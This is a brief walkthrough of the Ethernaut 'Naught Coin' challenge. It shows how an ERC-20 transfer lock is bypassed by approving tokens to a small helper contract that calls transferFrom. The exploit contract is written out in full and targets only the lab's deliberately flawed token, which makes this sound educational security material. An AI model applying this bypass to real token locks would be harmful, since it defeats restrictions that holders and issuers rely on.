# [15. Naught Coin](https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218)

Here we have a simple ERC-20 contract in our hands, that prevents us to `transfer` money to someone. However, this does not prevent us to `approve` that someone, and let them call `transferFrom` to take our money. That is precisely what we are going to do.

We create and deploy a simple contract:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0; 

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract NaughtWithdraw {
  function withdrawFrom(address _tokenAddr, address _from, uint _amount) public {
    bool success = IERC20(_tokenAddr).transferFrom(_from, address(this), _amount);
    require(success, "failed!");
  }
}
```

Then, we simply approve all our tokens to this address, and call `withdrawFrom` there with the respective parameters.